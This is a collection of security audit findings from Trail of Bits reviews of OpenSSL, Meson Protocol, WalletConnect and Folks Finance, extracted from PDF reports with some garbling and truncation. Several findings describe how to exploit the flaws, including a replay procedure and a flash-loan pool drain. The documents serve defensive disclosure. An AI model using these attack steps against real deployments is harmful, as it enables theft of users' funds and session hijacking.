EVP_MD_CTX_free(ctx); return ret; } Figure 23.2: If the requested key length n is greater than the digest size, the kdf_pbkdf1_do_derive function will copy uninitialized stack memory to the output buer. ( providers/implementations/kdfs/pbkdf1.c ) Exploit Scenario A server uses PBKDF1 as the legacy fallback algorithm for hashing passwords. A conguration issue causes the server to request an output from PBKDF1 that is longer than the digest size. This causes the output digest to contain uninitialized stack memory, making the authentication process based on the resulting password hash nondeterministic. Recommendations Short term, add a check to ensure that the requested output length from PBKDF1 is not longer than the digest size. Long term, ensure that MACs and KDFs are tested with invalid input parameters to ensure that they behave as expected on invalid inputs. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Hash collisions in untyped signatures Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "To post or execute a swap, a user must provide an ECDSA signature on a message containing the encoded swap information. The Meson protocol supports both typed (EIP-712) and legacy untyped (EIP-191) messages. The format of a message is determined by a bit in the encoded swap information itself. The Meson protocol denes two message types, a request message containing only an encoded swap and a release message containing the hash of an encoded swap concatenated with the recipients address. Figure 1.1 shows the relevant signature-verication code. 213 ... 237 238 239 function _checkRequestSignature( if (nonTyped) { bytes32 digest = keccak256(abi.encodePacked( bytes28(0x19457468657265756d205369676e6564204d6573736167653a0a3332), // HEX of \"\\x19Ethereum Signed Message:\\n32\" 240 241 242 243 244 ... 266 ... 293 294 295 encodedSwap )); require(signer == ecrecover(digest, v, r, s), \"Invalid signature\"); return; } function _checkReleaseSignature( if (nonTyped) { digest = keccak256(abi.encodePacked( bytes28(0x19457468657265756d205369676e6564204d6573736167653a0a3332), // HEX of \"\\x19Ethereum Signed Message:\\n32\" 296 297 ... keccak256(abi.encodePacked(encodedSwap, recipient)) )); Figure 1.1: contracts/utils/MesonHelpers.sol 11 Meson Protocol Fix Review Note that the form of both the request and release messages in the gure is \"\\x19Ethereum Signed Message:\\n32\" + msg, where msg is a 32-byte string. If an attacker could nd a message that would be interpreted as valid in both contexts, the attacker could use the signature on that message to both request and release funds, facilitating a number of potential attacks. Specically, the attacker would need to identify swap1, swap2, and recipient values such that swap1 = keccak256(swap2, recipient). The attacker could do that by choosing a valid swap2 value and then iterating through recipient values until nding one for which keccak256(swap2, recipient) would be interpreted as a valid message. With the current restrictions on the swap amount, chain, and token elds, we estimate that this would take between 260 and 270 tries. Fix Analysis This issue has been resolved. Untyped release messages are now prexed by the string \"\\x19Ethereum Signed Message:\\n52\", while request messages are prexed by \"\\x19Ethereum Signed Message:\\n32\". However, if Meson ever introduces new message types with a length of 32 or 53 bytes, their encodings may collide with the encodings of the existing message types. 12 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Typed signatures implement insecure nonstandard encodings Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "EIP-712 species standard encodings for the hashing and signing of typed structured data. The goal of typed structured signing standards is twofold: ensuring a unique injective encoding for structured data in order to prevent collisions (like that detailed in TOB-MES-1) and allowing wallets to display complex structured messages unambiguously in human-readable form. The images in gure 2.1 demonstrate the dierence between a complex untyped unstructured message (left) and its EIP-712 equivalent (right), both in MetaMask: Figure 2.1: A reproduction of images from the EIP-712 standard Meson currently uses a form of typed message encoding that does not conform to EIP-712. Specically, the encoding is not EIP-191 compliant and thus could theoretically collide with 13 Meson Protocol Fix Review the encoding of personal messages (Ethereum signed messages) or Recursive Length Prex (RLP)-encoded transactions. The digest format for swap requests is included in gure 2.2, in which REQUEST_TYPE_HASH corresponds to keccak256(\"bytes32 Sign to request a swap on Meson (Testnet)\"). bytes32 typehash = REQUEST_TYPE_HASH; bytes32 digest; 246 247 248 assembly { 249 250 251 252 253 } mstore(0, encodedSwap) mstore(32, keccak256(0, 32)) mstore(0, typehash) digest := keccak256(0, 64) Figure 2.2: contracts/utils/MesonHelpers.sol#246253 While the message types currently used in the protocol do not appear to have any dangerous interactions with each other, message types added to future versions of the protocol could theoretically introduce such issues. Fix Analysis This issue has not been resolved. Although the issue is not currently exploitable, we recommend that Meson exercise caution when adding new message types to prevent unexpected collisions between those message types and message types used by other protocols. 14 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing validation in the _addSupportToken function Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "Insucient input validation in the _addSupportToken function makes it possible to register the same token as supported multiple times. This does not cause a problem, because if there are duplicate entries for a token in the token list, the last one added will be the one that is used. However, it does mean that multiple indexes could point to the same token, while the token would point to only one of those indexes. function _addSupportToken(address token, uint8 index) internal { require(index != 0, \"Cannot use 0 as token index\"); _indexOfToken[token] = index; _tokenList[index] = token; 47 48 49 50 51 } Figure 3.1: contracts/utils/MesonTokens.sol Fix Analysis This issue has been resolved. The _addSupportToken function now validates that the token has not previously been registered, that the associated list index has not previously been used, and that the tokens address is not zero. The Meson team has also added tests to validate this behavior. 15 Meson Protocol Fix Review 4. Insu\u0000cient event generation Status: Resolved Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-MES-4 Target: contracts/Pools/MesonPools.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Use of an uninitialized state variable in functions Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The _mesonContract address is not set in the UCTUpgradeable contracts initialize function during the contracts initialization. As a result, the value of _mesonContract defaults to the zero address. The UCTUpgradeable.allowance and UCTUpgradeable.transferFrom functions perform checks that rely on the value of the _mesonContract state variable, which may lead to unexpected behavior. address private _mesonContract; function initialize(address minter) public initializer { __ERC20_init(\"USD Coupon Token (https://meson.fi)\", \"UCT\"); _owner = _msgSender(); _minter = minter; // _mesonContract = ; 18 19 20 21 22 23 24 25 } Figure 5.1: contracts/Token/UCTUpgradeable.sol:1825 54 function allowance(address owner, address spender) public view override returns (uint256) { 55 if (spender == _mesonContract) { Figure 5.2: contracts/Token/UCTUpgradeable.sol:5455 65 if (msgSender == _mesonContract && ERC20Upgradeable.allowance(sender, msgSender) < amount) { Figure 5.3: contracts/Token/UCTUpgradeable.sol:65 Fix Analysis This issue has been resolved. The _mesonContract address is now populated by the initialize function. 17 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Risk of upgrade issues due to missing __gap variable Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "None of the Meson protocol contracts include a __gap variable. Without this variable, it is not possible to add any new variables to the inherited contracts without causing storage slot issues. Specically, if variables are added to an inherited contract, the storage slots of all subsequent variables in the contract will shift by the number of variables added. Such a shift would likely break the contract. All upgradeable OpenZeppelin contracts contain a __gap variable, as shown in gure 6.1. 89 90 /** * @dev This empty reserved space is put in place to allow future versions to add new 91 92 93 94 * variables without shifting down storage in the inheritance chain. * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps */ uint256[49] private __gap; Figure 6.1: openzeppelin-contracts-upgradeable/OwnerUpgradeable.sol Fix Analysis This issue has been resolved. All stateful contracts inherited by UpgradableMeson now contain gap slots. Thus, new state variables can be added in future upgrades. 18 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. Lack of a zero-value check on the initialize function Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The UCTUpgradeable contracts initialize function fails to validate the address of the incoming minter argument. This means that the caller can accidentally set the minter variable to the zero address. function initialize(address minter) public initializer { __ERC20_init(\"USD Coupon Token (https://meson.fi)\", \"UCT\"); _owner = _msgSender(); _minter = minter; // _mesonContract = ; 20 21 22 23 24 25 } Figure 7.1: contracts/Token/UCTUpgradeable.sol:2025 If the minter address is set to the zero address, the admin must immediately redeploy the contract and set the address to the correct value; a failure to do so could result in unexpected behavior. Fix Analysis This issue has been partially resolved. The _mesonContract address, added as a parameter in the resolution of TOB-MES-5, is now checked against the zero value. However, the initialize function does not validate that the minter address is non-zero. 19 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Solidity compiler optimizations can be problematic Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The Meson protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Fix Analysis This issue has been resolved. The Solidity optimizer in the commit evaluated in this x review has been disabled. However, the Meson team indicated that this change causes the deployment gas amount to exceed the block gas limit. We recommend that Meson closely follow Solidity compiler releases and CHANGELOGs in order to quickly resolve any compiler optimization bugs. 20 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Service fees cannot be withdrawn Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "If the service fee charged for a swap is waived, the fee collected for the swap is stored at index zero of the _balanceOfPoolToken mapping. However, because the fee withdrawal function does not allow withdrawals from index zero of the mapping, the fee can never be withdrawn. Although this limitation may be purposeful, the code appears to indicate that it is a mistake. 198 if (!feeWaived) { // If the swap should pay service fee (charged by Meson protocol) 199 200 201 202 uint256 serviceFee = _serviceFee(encodedSwap); // Subtract service fee from the release amount releaseAmount -= serviceFee; // The collected service fee will be stored in `_balanceOfPoolToken` with `poolIndex = 0` 203 _balanceOfPoolToken[_poolTokenIndexForOutToken(encodedSwap, 0)] += serviceFee; Figure 9.1: contracts/Pools/MesonPools.sol:198203 70 71 72 73 74 function withdraw(uint256 amount, uint48 poolTokenIndex) external { require(amount > 0, \"Amount must be positive\"); uint40 poolIndex = _poolIndexFrom(poolTokenIndex); require(poolIndex != 0, \"Cannot use 0 as pool index\"); Figure 9.2: contracts/Pools/MesonPools.sol:7074 Moreover, even if the function allowed the withdrawal of tokens stored at poolIndex 0, a withdrawal would still not be possible. This is because the owner of poolIndex 0 is not set during initialization, and it is not possible to register a pool with index 0. 13 14 function initialize(address[] memory supportedTokens) public { require(!_initialized, \"Contract instance has already been initialized\"); 21 Meson Protocol Fix Review _initialized = true; _owner = _msgSender(); _premiumManager = _msgSender(); for (uint8 i = 0; i < supportedTokens.length; i++) { _addSupportToken(supportedTokens[i], i + 1); 15 16 17 18 19 20 21 22 } } Figure 9.3: contracts/UpgradableMeson.sol:1322 Fix Analysis This issue has been resolved. The source code now includes comments explaining that the service fee will not be withdrawable until the contract is updated. 22 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Lack of contract existence check on transfer / transferFrom calls Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The MesonHelpers contract uses the low-level call function to execute the transfer / transferFrom function of an ERC20 token. However, it does not rst perform a contract existence check. Thus, if there is no contract at the token address, the low-level call will still return success. This means that if a supported token is subsequently self-destructed (which is unlikely to happen), it will be possible for a posted swap involving that token to succeed without actually depositing any tokens. function _unsafeDepositToken( address token, address sender, uint256 amount, bool isUCT 53 54 55 56 57 58 ) internal { 59 60 61 62 require(token != address(0), \"Token not supported\"); require(amount > 0, \"Amount must be greater than zero\"); (bool success, bytes memory data) = token.call(abi.encodeWithSelector( bytes4(0x23b872dd), // bytes4(keccak256(bytes(\"transferFrom(address,address,uint256)\"))) 63 64 65 66 sender, address(this), amount // isUCT ? amount : amount * 1e12 // need to switch to this line if deploying to BNB Chain or Conflux 67 68 )); require(success && (data.length == 0 || abi.decode(data, (bool))), \"transferFrom failed\"); 69 } Figure 10.1: contracts/util/MesonHelpers.sol:5369 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first 23 Meson Protocol Fix Review return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 10.2: A snippet of the Solidity documentation detailing unexpected behavior related to call Fix Analysis This issue has been resolved. The low-level call is now paired with OpenZeppelins Address.isContract function, which ensures that the contract at the target address is populated as expected. This makes the deposit mechanism robust against self-destructs. 24 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. USDT transfers to third-party contracts will fail Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "To allow a user to release funds to a smart contract, the Meson protocol increases the contracts allowance (via a call to increaseAllowance) and then calls the contract, as shown in gure 11.1. 66 IERC20Minimal(token).increaseAllowance(contractAddr, adjustedAmount); 67 ITransferWithBeneficiary(contractAddr).transferWithBeneficiary(token, adjustedAmount, beneficiary, data); Figure 11.1: contracts/utils/MesonHelpers.sol#6667 The increaseAllowance method, which is part of OpenZeppelins ERC20 library, was introduced to prevent race conditions when token allowances are changed via top-level calls. However, this method is not in the ERC20 specication, and not all tokens implement it. In particular, USDT does not implement the method on the Ethereum mainnet. Thus, any attempt to release USDT to a smart contract wallet during a swap will fail, trapping the users funds. Fix Analysis This issue has been resolved. The protocol now uses the standard ERC20 approve function to increase allowances. The team also made subtle changes to the allowance behavior: instead of incrementing an allowance when executing a transfer, the Meson contract now sets the allowance to the most recent transfer amount. If a third-party contract has an outstanding allowance from a previous swap release, it will forfeit those tokens upon the next transfer. Meson has conrmed that this is the intended behavior. 25 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. SDK function _randomHex returns low-quality randomness Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The Meson protocol software development kit (SDK) uses the _randomHex function to generate random salts for new swaps. This function accepts a string length as input and produces a random hexadecimal string of that length. To do that, _randomHex uses the JavaScript Math.random function to generate a 32-bit integer and then encodes the integer as a zero-padded hexadecimal string. The result is eight random hexadecimal characters, padded with zeros to the desired length. However, the function is called with an argument of 16, so half of the characters in the salt it produces will be zero. } 95 96 97 98 99 100 101 102 103 104 } 105 106 107 108 109 110 111 112 113 } private _makeFullSalt(salt?: string): string { if (salt) { if (!isHexString(salt) || salt.length > 22) { throw new Error('The given salt is invalid') } return `${salt}${this._randomHex(22 - salt.length)}` return `0x0000${this._randomHex(16)}` private _randomHex(strLength: number) { if (strLength === 0) { return '' } const max = 2 ** Math.min((strLength * 4), 32) const rnd = BigNumber.from(Math.floor(Math.random() * max)) return hexZeroPad(rnd.toHexString(), strLength / 2).replace('0x', '') Figure 12.1: packages/sdk/src/Swap.ts#95113 Furthermore, the Math.random function is not suitable for uses in which the output of the random number generator should be unpredictable. While the protocols current use of the function does not pose a security risk, future implementers and library users may assume that the function produces the requested amount of high-quality entropy. 26 Meson Protocol Fix Review Fix Analysis This issue has been partially resolved. While the _randomHex function now uses cryptographic randomness to generate random hexadecimal characters, the function continues to silently output leading zeros when more than eight characters are requested or when an odd number of characters is requested. To prevent future misuse of this function, we recommend having it return a uniformly random string with the exact number of characters requested. 27 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. encodedSwap values are used as primary swap identier Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The primary identier of swaps in the MesonSwap contract is the encodedSwap structure. This structure does not contain the address of a swaps initiator, which is recorded, along with the poolIndex of the bonded liquidity provider (LP), as the postingValue. If a malicious actor or maximal extractable value (MEV) bot were able to front-run a users transaction and post an identical encodedSwap, the original initiators transaction would fail, and the initiators swap would not be posted. 48 function postSwap(uint256 encodedSwap, bytes32 r, bytes32 s, uint8 v, uint200 postingValue) external forInitialChain(encodedSwap) 49 50 { 51 require(_postedSwaps[encodedSwap] == 0, \"Swap already exists\"); ... Figure 13.1: contracts/Swap/MesonSwap.sol#4852 Because the Meson protocol supports only 1-to-1 stablecoin swaps, transaction front-running is unlikely to be protable. However, a bad actor could dramatically aect a specic users ability to transact within the system. Fix Analysis This issue has not been resolved. Meson acknowledged that user transactions can be blocked from execution by malicious actors. However, blocking a swap transaction would require an adversary to post a corresponding swap, and to thus burn gas and have his or her funds temporarily locked; these disincentives limit the impact of this issue. 28 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Unnecessary _releasing mutex increases gas costs Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "When executing a swap in the third-party dApp integration release mode, the Meson protocol makes a call to an untrusted user-specied smart contract. To prevent reentrancy attacks, a ag is set before and cleared after the untrusted contract call. 181 ... require(!_releasing, \"Another release is running\"); 219 220 _transferToContract(_tokenList[tokenIndex], recipient, initiator, amount, _releasing = true; tokenIndex == 255, _saltDataFrom(encodedSwap)); 221 _releasing = false; Figure 14.1: contracts/Pools/MesonPools.sol#181221 This ag is not strictly necessary, as by the time the contract reaches the untrusted call, it has already cleared the _lockSwaps entry corresponding to the release, preventing duplicate releases via reentrancy. uint80 lockedSwap = _lockedSwaps[swapId]; require(lockedSwap != 0, \"Swap does not exist\"); 191 192 ... 196 _checkReleaseSignature(encodedSwap, recipient, r, s, v, initiator); 197 ... 211 _release(encodedSwap, tokenIndex, initiator, recipient, releaseAmount); _lockedSwaps[swapId] = 0; Figure 14.2: contracts/Pools/MesonPools.sol#191197 Fix Analysis This issue has been resolved. The redundant _releasing ag has been removed. The call to the external contract is the last step in the transaction, which prevents reentrancy attacks. 29 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Missing validation in the _addSupportToken function Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "Insucient input validation in the _addSupportToken function makes it possible to register the same token as supported multiple times. This does not cause a problem, because if there are duplicate entries for a token in the token list, the last one added will be the one that is used. However, it does mean that multiple indexes could point to the same token, while the token would point to only one of those indexes. function _addSupportToken(address token, uint8 index) internal { require(index != 0, \"Cannot use 0 as token index\"); _indexOfToken[token] = index; _tokenList[index] = token; 47 48 49 50 51 } Figure 3.1: contracts/utils/MesonTokens.sol Fix Analysis This issue has been resolved. The _addSupportToken function now validates that the token has not previously been registered, that the associated list index has not previously been used, and that the tokens address is not zero. The Meson team has also added tests to validate this behavior. 15 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Insu\u0000cient event generation Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "Several critical operations in the MesonPools contract do not emit events. As a result, it will be dicult to review the correct behavior of the contract once it has been deployed. The following operations should trigger events:  MesonPools.depositAndRegister  MesonPools.deposit  MesonPools.withdraw  MesonPools.addAuthorizedAddr  MesonPools.removeAuthorizedAddr  MesonPools.unlock Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior and may therefore overlook attacks or malfunctioning contracts. Fix Analysis This issue has been resolved. All of the functions listed in this nding now emit events, enabling Meson and protocol users to easily track all contract operations. 16 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Misleading result returned by view function getPostedSwap Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "body": "The value returned by the getPostedSwap function to indicate whether a swap has been executed can be misleading. Once a swap has been executed, the value of the swap is reset to either 0 or 1. However, the getPostedSwap function returns a result indicating that a swap has been executed only if the swaps value is 1. if (_expireTsFrom(encodedSwap) < block.timestamp + MIN_BOND_TIME_PERIOD) { // The swap cannot be posted again and therefore safe to remove it. // LPs who execute in this mode can save ~5000 gas. _postedSwaps[encodedSwap] = 0; 141 142 143 144 145 } else { 146 // The same swap information can be posted again, so set `_postedSwaps` value to 1 to prevent that. 147 148 } _postedSwaps[encodedSwap] = 1; Figure 15.1: contracts/Swap/MesonSwap.sol:140148 161 162 163 164 { 165 166 167 168 169 170 171 172 173 } /// @notice Read information for a posted swap function getPostedSwap(uint256 encodedSwap) external view returns (address initiator, address poolOwner, bool executed) uint200 postedSwap = _postedSwaps[encodedSwap]; initiator = _initiatorFromPosted(postedSwap); executed = postedSwap == 1; if (initiator == address(0)) { poolOwner = address(0); } else { } poolOwner = ownerOfPool[_poolIndexFromPosted(postedSwap)]; Figure 15.2: contracts/Swap/MesonSwap.sol:162173 30 Meson Protocol Fix Review Front-end services (or any other service interacting with this function) may be misled by the return value, reacting as though a swap has not been executed when it actually has. Fix Analysis This issue has been resolved. The getPostedSwap functions return value has been renamed to exist, which more accurately reects the meaning of the value. 31 Meson Protocol Fix Review A. Status Categories The following table describes the statuses used to indicate whether an issue has been suciently addressed. Fix Status Status",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Use of outdated dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf",
        "body": "We used npm audit and lerna-audit to detect the use of outdated dependencies in the codebase. These tools discovered a number of vulnerable packages that are referenced by the package-lock.json les. The following tables describe the vulnerable dependencies used in the walletconnect-utils and walletconnect-monorepo repositories : walletconnect-utils Dependencies Vulnerability Report Vulnerability",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. No protocol-level replay protections in WalletConnect ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf",
        "body": "Applications and wallets using WalletConnect v2 can exchange messages using the WalletConnect protocol through a public WebSocket relay server. Exchanged data is encrypted and authenticated with keys unknown to the relay server. However, using dynamic testing during the audit, we observed that the protocol does not protect against replay attacks. The WalletConnect authentication protocol is essentially a challenge-response protocol between users and servers, where users produce signatures using the private keys from their wallets. A signature is performed over a message containing, among many other components, a nonce value chosen by the server. This nonce value is intended presumably to prevent an adversary from replaying an old signature that a user generated to authenticate themselves. However, there does not seem to be any validation against this nonce value (except validation that it exists), so the library would accept replayed signatures. In addition to missing validation of the nonce value, the payload for the signature does not appear to include the pairing topic for the pairing established between a user and the server. Because the authentication protocol runs only over an existing pairing, it would make sense to include the pairing topic value inside the signature payload. Doing so would prevent a malicious user from replaying another users previously generated signature for a new pairing that they establish with the server. To repeat our experiment that uncovered this issue, pair the React App demo application with the React Wallet demo application and intercept the trac generated from the React App demo application (e.g., use a local proxy such as BurpSuite). Initiate a transaction from the application, capture the data sent through the WebSocket channel, and conrm the transaction in the wallet. A sample captured message is shown in gure 2.1. Now, edit the message eld slightly and add == to the end of the string (= is the Base64 padding character). Finally, replay (resend) the captured data. A new conrmation dialog box should appear in the wallet. { \"id\" : 1680643717702847 , \"jsonrpc\" : \"2.0\" , \"method\" : \"irn_publish\" , \"params\" : { \"topic\" : \"42507dee006fe8(...)2d797cccf8c71fa9de4\" , \"message\" : \"AFv70BclFEn6MteTRFemaxD7Q7(...)y/eAPv3ETRHL0x86cJ6iflkIww\" , \"ttl\" : 300 , \"prompt\" : true , \"tag\" : 1108 } } Figure 2.1: A sample message sent from the dApp This nding is of undetermined severity because it is not obvious whether and how an attacker could use this vulnerability to impact users. When this nding was originally presented to the WalletConnect team, the recommended remediation was to track and enforce the correct nonce values. However, due to the distributed nature of the WalletConnect system, this could prove dicult in practice. In response, we have updated our recommendation to use timestamps instead. Timestamps are not as eective as nonces are for preventing replay attacks because it is not always possible to have a secure clock that can be relied upon. However, if nonces are infeasible to implement, timestamps are the next best option. Recommendations Short term, update the implementation of the authentication protocol to include timestamps in the signature payload that are then checked against the current time (within a reasonable window of time) upon signature validation. In addition to this, include the pairing topic in the signature payload. Long term, consider including all relevant pairing and authentication data in the signature payload, such as sender and receiver public keys. If possible, consider using nonces instead of timestamps to more eectively prevent replay attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Key derivation code could produce keys composed of all zeroes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf",
        "body": "The current implementation of the code that derives keys using the x25519 library does not enable the rejectZero option. If the counterparty is compromised, this may result in a derived key composed of all zeros, which could allow an attacker to observe or tamper with the communication. export function deriveSymKey(privateKeyA: string , publicKeyB: string ): string { const sharedKey = x25519.sharedKey( fromString(privateKeyA, BASE16), fromString(publicKeyB, BASE16), ); const hkdf = new HKDF(SHA256, sharedKey); const symKey = hkdf.expand(KEY_LENGTH); return toString(symKey, BASE16); } Figure 3.1: The code that derives keys using x25519.sharedKey ( walletconnect-monorepo/packages/utils/src/crypto.ts#3543 ) The x25519 library includes a warning about this case: /** * Returns a shared key between our secret key and a peer's public key. * * Throws an error if the given keys are of wrong length. * * If rejectZero is true throws if the calculated shared key is all-zero . * From RFC 7748: * * > Protocol designers using Diffie-Hellman over the curves defined in * > this document must not assume \"contributory behavior\". Specially, * > contributory behavior means that both parties' private keys * > contribute to the resulting shared key. Since curve25519 and * > curve448 have cofactors of 8 and 4 (respectively), an input point of * > small order will eliminate any contribution from the other party's * > private key. This situation can be detected by checking for the all- * > zero output, which implementations MAY do, as specified in Section 6. * > However, a large number of existing implementations do not do this. * * IMPORTANT: the returned key is a raw result of scalar multiplication. * To use it as a key material, hash it with a cryptographic hash function. */ Figure 3.2: Warnings in x25519.sharedKey ( stablelib/packages/x25519/x25519.ts#595615 ) This nding is of informational severity because a compromised counterparty would already allow an attacker to observe or tamper with the communication. Exploit Scenario An attacker compromises the web server on which a dApp is hosted and introduces malicious code in the front end that makes it always provide a low-order point during the key exchange. When a user connects to this dApp with their WalletConnect-enabled wallet, the derived key is all zeros. The attacker passively captures and reads the exchanged messages. Recommendations Short term, enable the rejectZero ag for uses of the deriveSymKey function. Long term, when using cryptographic primitives, research any edge cases they may have and always review relevant implementation notes. Follow recommended practices and include any defense-in-depth safety checks to ensure the protocol operates as intended.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Insecure storage of session data in local storage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf",
        "body": "HTML5 local storage is used to hold session data, including keychain values. Because there are no access controls on modifying and retrieving this data using JavaScript, data in local storage is vulnerable to XSS attacks. Figure 4.1: Keychain data stored in a browsers localStorage Exploit Scenario Alice discovers an XSS vulnerability in a dApp that supports WalletConnect. This vulnerability allows Alice to retrieve the dApps keychain data, allowing her to propose new transactions to the connected wallet. Recommendations Short term, consider using cookies to store and send tokens. Enable cross-site request forgery (CSRF) libraries available to mitigate these attacks. Ensure that cookies are tagged with httpOnly , and preferably secure , to ensure that JavaScript cannot access them. References  OWASP HTML5 Security Cheat Sheet: Local Storage A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Ability to drain a pool by reusing a ash_loan_end index ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "The lack of validation of the flash_loan_end transaction could enable an attacker to drain a pool of its funds by reusing the same repayment transaction for multiple loans. Flash loan operations are split into two transactions included in the same group: a flash_loan_begin transaction (shown in gure 1.1) and a flash_loan_end transaction (shown in gure 1.2). CODE REDACTED CODE REDACTED Figure 1.1: REDACTED Figure 1.2: REDACTED The flash_loan_begin method sends the assets to the user taking out the ash loan and checks that there is an associated flash_loan_end transaction later in the transaction group. The flash_loan_end method ensures that the associated repayment transaction ( send_asset_txn ) has the correct amount value. CODE REDACTED Figure 1.3: REDACTED The flash_loan_key value serves as a mutex and is used to prevent a user from taking out a new ash loan before the users previous ash loan is complete. The flash_loan_begin method checks that flash_loan_key is set to 0 and then sets it to 1; flash_loan_end checks that flash_loan_key is set to 1 and then sets it to 0. However, there is no validation of whether the flash_loan_end transaction at the index passed to flash_loan_begin is the one that resets the flash_loan_key mutex. An attacker could reuse the same repayment in flash_loan_end transaction in multiple calls to flash_loan_begin , as long as he created additional calls to flash_loan_end (with any amount value) to reset the mutex. Thus, an attacker could drain a pool by taking out ash loans without repaying them. Exploit 